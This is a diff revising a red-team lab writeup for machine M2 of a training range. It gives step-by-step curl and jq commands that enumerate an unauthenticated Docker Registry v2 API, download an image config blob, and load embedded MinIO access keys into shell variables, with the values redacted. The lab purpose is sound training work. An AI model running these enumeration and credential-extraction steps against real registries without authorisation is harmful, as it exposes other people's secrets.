@@ -2,80 +2,84 @@
 ## Red Team Solution Writeup
 **Range:** RNG-DEV-01 · VIKAS TANTRA
 **Machine:** M2 — PUL Container Registry
-**Vulnerability:** Unauthenticated Docker Registry v2 API + Credentials in Image Config ENV Blob
-**MITRE:** T1552.001 (Credentials in Files) · T1613 (Container and Resource Discovery)
-**Severity:** Hard | **Operator:** Rudra-7
+**Vulnerability:** Anonymous Docker Registry v2 reads and credentials embedded in an image config
+**MITRE ATT&CK:** T1552.001 · T1613
+**Severity:** Hard
 
 ---
+
 ## Objective
-Use the artifact downloaded from M1 to identify the registry credential if needed. Registry read endpoints in this lab are accessible without authentication. Pull the firmware-builder image manifest and config blob, then load the MinIO values from its environment metadata.
 
----
-## Step-by-Step
+Enumerate the PUL Container Registry v2 API, retrieve the firmware-builder image config blob, and load the MinIO environment values. The registry's read endpoints are available without authentication; M1's credential candidate is not required for these requests.
 
-### Step 1 — Discover Registry
+## Environment
+
+| Item | Value |
+|---|---|
+| Registry host | `203.0.3.36` |
+| Registry port | `5000` |
+| API | Docker Registry v2 |
+| Authentication | Not required for the read endpoints used here |
+| Next machine | M3 artifact store, port `9000` |
+
+## Step-by-Step Exploitation
+
+### Step 1 — Confirm the Registry API
+
 ```bash
-curl --max-time 8 -fsS http://203.0.3.36:5000/v2/
-# Returns: {} with Docker-Distribution-Api-Version: registry/2.0 header
+curl --max-time 8 -fsS -i http://203.0.3.36:5000/v2/ | sed -n '1,8p'
 ```
 
+The response is HTTP 200 and includes the Docker Registry v2 header.
 
+### Step 2 — Enumerate repositories
 
-
-### Step 2 — Enumerate Repositories (unauthenticated)
 ```bash
-curl --max-time 8 -fsS http://203.0.3.36:5000/v2/_catalog
-# {"repositories":["pul/firmware-builder","pul/sonar-runner"]}
+curl --max-time 8 -fsS http://203.0.3.36:5000/v2/_catalog | jq .
 ```
 
+The catalog lists `pul/firmware-builder` and `pul/sonar-runner`.
 
+### Step 3 — Get firmware-builder tags
 
-
-### Step 3 — Get Tags
 ```bash
-curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/tags/list
-# {"name":"pul/firmware-builder","tags":["latest","v3.2.1","v3.1.0","v3.0.5"]}
+curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/tags/list | jq .
 ```
 
+The repository includes `latest`, `v3.2.1`, `v3.1.0`, and `v3.0.5`.
 
+### Step 4 — Read the image manifest
 
-
-### Step 4 — Get Manifest (extract config digest)
 ```bash
 curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/manifests/latest | jq .
 ```
-Note the config digest: `sha256:a4f3c2b1e8d7...`
 
+The config digest for `latest` is:
 
+```text
+sha256:a4f3c2b1e8d7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1
+```
 
+### Step 5 — Retrieve the config blob
 
-### Step 5 — Download Config Blob (contains ENV with credentials)
 ```bash
 DIGEST="sha256:a4f3c2b1e8d7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1"
 curl --max-time 8 -fsS "http://203.0.3.36:5000/v2/pul/firmware-builder/blobs/${DIGEST}" -o "$RANGE3_DIR/registry-config.json"
 printf 'ENV keys: %s\n' "$(jq -r '[.config.Env[] | split("=")[0]] | join(", ")' "$RANGE3_DIR/registry-config.json")"
 export MINIO_ACCESS_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_ACCESS_KEY=")) | sub("^[^=]*=";"")' "$RANGE3_DIR/registry-config.json")"
 export MINIO_SECRET_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_SECRET_KEY=")) | sub("^[^=]*=";"")' "$RANGE3_DIR/registry-config.json")"
-printf 'MinIO credentials loaded into this shell; values not printed.\n'
+printf 'MinIO values loaded into this shell; values not printed.\n'
 ```
 
+The image environment includes MinIO access values. They are redacted in this public writeup. Its `ARTIFACT_STORE_HOST` is the scenario placeholder `11.x.x.x`; the artifact store in this deployment is reachable at `203.0.3.36:9000`.
 
+## MITRE ATT&CK Mapping
 
-ENV layer reveals:
-```
-"ARTIFACT_STORE_HOST=11.x.x.x"
-"ARTIFACT_STORE_PORT=9000"
-"MINIO_ACCESS_KEY=<redacted>"
-"MINIO_SECRET_KEY=<redacted>"
-```
-
-The image configuration also contains the literal host placeholder `11.x.x.x`; in this deployment the artifact store is reachable at `203.0.3.36:9000`.
-
-**Pivot:** MinIO values are loaded into `MINIO_ACCESS_KEY` and `MINIO_SECRET_KEY`; the M3 bucket endpoints in this lab are public. Treat both values as compromised and lab-only.
-
----
-## MITRE Mapping
 | Tactic | Technique | ID |
 |---|---|---|
 | Discovery | Container and Resource Discovery | T1613 |
 | Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
+
+## Notes for Operator
+
+Keep the same Kali terminal open so `RANGE3_DIR`, `MINIO_ACCESS_KEY`, and `MINIO_SECRET_KEY` remain available for the following steps. M3's bucket is public, so the MinIO values are not needed for its documented read requests.
